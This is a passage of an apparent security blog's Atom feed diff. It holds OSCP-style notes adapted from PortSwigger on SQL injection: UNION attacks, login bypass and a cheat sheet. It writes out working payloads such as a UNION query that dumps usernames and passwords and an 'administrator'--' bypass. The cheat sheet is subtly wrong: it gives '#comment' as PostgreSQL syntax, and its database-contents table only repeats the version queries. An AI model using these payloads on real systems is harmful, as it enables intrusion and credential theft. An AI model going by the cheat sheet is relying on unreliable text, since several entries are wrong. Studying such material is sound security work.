class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;
+&lt;p&gt;Of course, the crucial information needed to perform this attack is that there is a table called ==users== with two columns called ==username== and ==password==. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables"&gt;SQL injection UNION attack, retrieving data from other tables&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Read more&lt;/strong&gt;
+* [[Examining the database in SQL injection attacks]]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Retrieving multiple values within a single column&lt;/h2&gt;
+&lt;p&gt;In the preceding example, suppose instead that the query only returns a single column.
+You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39; UNION SELECT username || &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;span class="nv"&gt;@kali&lt;/span&gt;&lt;span class="p"&gt;:~$&lt;/span&gt; &lt;span class="n"&gt;snmpwalk&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;-v1&lt;/span&gt; &lt;span class="n"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;50&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;151&lt;/span&gt; &lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;13&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;3&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="OSCP"></category></entry></feed>
+&lt;p&gt;This uses the double-pipe sequence ==||== which is a string concatenation operator on Oracle. The injected query concatenates together the values of the ==username== and ==password== fields, separated by the ==~== character.
+The results from the query will let you read all of the usernames and passwords, for example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;...
+administrator~s3cure
+wiener~peter
+carlos~montoya
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that different databases use different syntax to perform string concatenation. For more details, see the &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"&gt;SQL injection cheat sheet&lt;/a&gt;.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;🧪 LAB PRACTITIONER&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column"&gt;SQL injection UNION attack, retrieving multiple values in a single column&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;</content><category term="web"></category></entry><entry><title>SQL Injection Cheat Sheet</title><link href="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/" rel="alternate"></link><published>2024-05-19T21:03:00+01:00</published><updated>2024-05-19T21:03:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/sqli-cheat-sheet/</id><summary type="html">&lt;h1&gt;SQL injection cheat sheet&lt;/h1&gt;
+&lt;h1&gt;OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION&lt;/h1&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/SQLI_CHEAT_SHEET/black-green-cheat-sheet-stamp-black-green-cheat-sheet-stamp-illustration-graphic-concept-108947651.jpg.webp"&gt;&lt;/p&gt;
+&lt;p&gt;This &lt;strong&gt;SQL injection&lt;/strong&gt; cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.&lt;/p&gt;
+&lt;h2&gt;String concatenation&lt;/h2&gt;
+&lt;p&gt;You can concatenate together multiple strings to make a single …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;SQL injection cheat sheet&lt;/h1&gt;
+&lt;h1&gt;OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION&lt;/h1&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-cheat-sheet/SQLI_CHEAT_SHEET/black-green-cheat-sheet-stamp-black-green-cheat-sheet-stamp-illustration-graphic-concept-108947651.jpg.webp"&gt;&lt;/p&gt;
+&lt;p&gt;This &lt;strong&gt;SQL injection&lt;/strong&gt; cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.&lt;/p&gt;
+&lt;h2&gt;String concatenation&lt;/h2&gt;
+&lt;p&gt;You can concatenate together multiple strings to make a single string.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;=='foo'||'bar'==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo'+'bar'==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo'||'bar'==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;=='foo' 'bar'== [Note the space between the two strings]&lt;br&gt;==CONCAT('foo','bar')==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;## Substring&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ==ba==.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==SUBSTR('foobar', 4, 2)==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SUBSTRING('foobar', 4, 2)==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SUBSTRING('foobar', 4, 2)==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SUBSTRING('foobar', 4, 2)==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Comments&lt;/h2&gt;
+&lt;p&gt;You can use comments to truncate a query and remove the portion of the original query that follows your input.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==--comment==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==/*comment*/==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==#comment==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==-- comment==  [Note the space after the double dash]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Database version&lt;/h2&gt;
+&lt;p&gt;You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==SELECT banner FROM v$version==&lt;br&gt;==SELECT version FROM v$instance==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT version()==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2&gt;Database contents&lt;/h2&gt;
+&lt;p&gt;You can list the tables that exist in the database, and the columns that those tables contain.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;Oracle&lt;/th&gt;
+&lt;th style="text-align: center;"&gt;==SELECT banner FROM v$version==&lt;br&gt;==SELECT version FROM v$instance==&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;Microsoft&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT version()==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/td&gt;
+&lt;td style="text-align: center;"&gt;==SELECT @@version==&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;</content><category term="web"></category></entry><entry><title>SQL Injection</title><link href="https://sfinx.kozow.com/2024/5/19/sql-injection/" rel="alternate"></link><published>2024-05-19T20:48:00+01:00</published><updated>2024-05-19T20:48:00+01:00</updated><author><name>MedSecure</name></author><id>tag:sfinx.kozow.com,2024-05-19:/2024/5/19/sql-injection/</id><summary type="html">&lt;h1&gt;💉SQL Injection&lt;/h1&gt;
+&lt;h1&gt;OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION&lt;/h1&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/SQL-Injection.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;In this section, we'll explain what SQL injection (SQLi) is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p&gt;
+&lt;p&gt;For a brief resume on all payloads to use …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;💉SQL Injection&lt;/h1&gt;
+&lt;h1&gt;OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION&lt;/h1&gt;
+&lt;p&gt;&lt;img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sql-injection/SQLI/SQL-Injection.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;In this section, we'll explain what SQL injection (SQLi) is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p&gt;
+&lt;p&gt;For a brief resume on all payloads to use for SQL injection testing, try the following cheat sheet:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[[SQL injection cheat sheet|SQL Injection Cheat Sheet !]]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Summary&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;[[💉SQL Injection/What is SQL injection (SQLi) ?|What is SQL injection (SQLi) ?]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/What is the impact of a successful SQL injection attack?|What is the impact of a successful SQL injection attack?]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/How to detect SQL injection vulnerabilities|How to detect SQL injection vulnerabilities]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/SQL injection in different parts of the query|SQL injection in different parts of the query]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/SQL injection examples|SQL injection examples]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/Retrieving hidden data|Retrieving hidden data]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/Subverting application logic|Subverting application logic]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/Retrieving data from other database tables|Retrieving data from other database tables]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/Blind SQL injection vulnerabilities|Blind SQL injection vulnerabilities]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/Second-order SQL injection|Second-order SQL injection]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/Examining the database|Examining the database]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/SQL injection in different contexts|SQL injection in different contexts]]&lt;/li&gt;
+&lt;li&gt;[[💉SQL Injection/How to prevent SQL injection|How to prevent SQL injection]]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;What is SQL injection (SQLi) ?&lt;/h3&gt;
+&lt;p&gt;SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://youtu.be/wX6tszfgYp4"&gt;What is SQL Injection&lt;/a&gt;&lt;!-- {"preview":"true"} --&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;What is the impact of a successful SQL injection attack?&lt;/h3&gt;
+&lt;p&gt;A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;How to detect SQL injection vulnerabilities&lt;/h3&gt;
+&lt;p&gt;The majority of SQL injection vulnerabilities can be found quickly and reliably using Burp Suite's &lt;a href="https://portswigger.net/burp/vulnerability-scanner"&gt;web vulnerability scanner&lt;/a&gt;.
+SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:
+* Submitting the single quote character =='== and looking for errors or other anomalies.
+* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+* Submitting Boolean conditions such as ==OR 1=1== and ==OR 1=2==, and looking for differences in the application's responses.
+* Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
+* Submitting &lt;a href="https://portswigger.net/burp/application-security-testing/oast"&gt;OAST&lt;/a&gt; payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;SQL injection in different parts of the query&lt;/h3&gt;
+&lt;p&gt;Most SQL injection vulnerabilities arise within the &lt;em&gt;==WHERE==&lt;/em&gt; clause of a &lt;em&gt;==SELECT==&lt;/em&gt; query. This type of SQL injection is generally well-understood by experienced testers.
+But SQL injection vulnerabilities can in principle occur at any location within the query, and within different query types. The most common other locations where SQL injection arises are:
+* In &lt;em&gt;==UPDATE==&lt;/em&gt; statements, within the updated values or the &lt;em&gt;==WHERE==&lt;/em&gt; clause.
+* In &lt;em&gt;==INSERT==&lt;/em&gt; statements, within the inserted values.
+* In &lt;em&gt;==SELECT==&lt;/em&gt; statements, within the table or column name.
+* In &lt;em&gt;==SELECT==&lt;/em&gt; statements, within the &lt;em&gt;==ORDER BY==&lt;/em&gt; clause.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;SQL injection examples&lt;/h3&gt;
+&lt;p&gt;There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:
+* &lt;a href="https://portswigger.net/web-security/sql-injection#retrieving-hidden-data"&gt;Retrieving hidden data&lt;/a&gt;, where you can modify a SQL query to return additional results.
+* &lt;a href="https://portswigger.net/web-security/sql-injection#subverting-application-logic"&gt;Subverting application logic&lt;/a&gt;, where you can change a query to interfere with the application's logic.
+* &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks"&gt;UNION attacks&lt;/a&gt;, where you can retrieve data from different database tables.
+* &lt;a href="https://portswigger.net/web-security/sql-injection/blind"&gt;Blind SQL injection&lt;/a&gt;, where the results of a query you control are not returned in the application's responses.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Retrieving hidden data&lt;/h3&gt;
+&lt;p&gt;Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
+ ```
+https://insecure-website.com/products?category=Gifts&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This causes the application to make a SQL query to retrieve details of the relevant products from the database:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;products&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;category&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Gifts&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;released&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This SQL query asks the database to return:
+* all details (*)
+* from the products table
+* where the category is Gifts
+* and released is 1.&lt;/p&gt;
+&lt;p&gt;⠀The restriction &lt;em&gt;==released = 1==&lt;/em&gt; is being used to hide products that are not released. For unreleased products, presumably &lt;em&gt;==released = 0==&lt;/em&gt;.
+The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like:
+ ```
+https://insecure-website.com/products?category=Gifts'--&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;This results in the SQL query:
+```sql
+SELECT * FROM products WHERE category = &amp;#39;Gifts&amp;#39;--&amp;#39; AND released = 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The key thing here is that the double-dash sequence ==--== is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes ==&lt;em&gt;AND released = 1&lt;/em&gt;==. This means that all products are displayed, including unreleased products.
+Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:
+ ```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;This results in the SQL query:
+```sql
+SELECT * FROM products WHERE category = &amp;#39;Gifts&amp;#39; OR 1=1--&amp;#39; AND released = 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since ==&lt;em&gt;1=1&lt;/em&gt;== is always true, the query will return all items.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;
+Take care when injecting the condition ==OR 1=1== into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an ==UPDATE== or ==DELETE== statement, for example, this can result in an accidental loss of data.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;🧪LAB APPRENTICE&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"&gt;SQL injection vulnerability in WHERE clause allowing retrieval of hidden data&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;h3&gt;Subverting application logic&lt;/h3&gt;
+&lt;p&gt;Consider an application that lets users log in with a username and password. If a user submits the username &lt;em&gt;==wiener==&lt;/em&gt; and the password &lt;em&gt;==bluecheese==&lt;/em&gt;, the application checks the credentials by performing the following SQL query:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;wiener&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bluecheese&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
+Here, an attacker can log in as any user without a password simply by using the SQL comment sequence ==--== to remove the password check from the ==WHERE== clause of the query. For example, submitting the username ==administrator'--== and a blank password results in the following query:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class="c1"&gt;--&amp;#39; AND password = &amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This query returns the user whose username is &lt;em&gt;==administrator==&lt;/em&gt; and successfully logs the attacker in as that user.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style="text-align: center;"&gt;🧪LAB APPRENTICE&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center;"&gt;&lt;a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data"&gt;SQL injection vulnerability in WHERE clause allowing retrieval of hidden data&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;h3&gt;Retrieving data from other database tables&lt;/h3&gt;
+&lt;p&gt;In cases where the results of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection vulnerability to retrieve data from other tables within the database. This is done using the ==UNION== keyword, which lets you execute an additional ==SELECT== query and append the results to the original query.
+For example, if an application executes the following query containing the user input "Gifts":&lt;/p&gt;
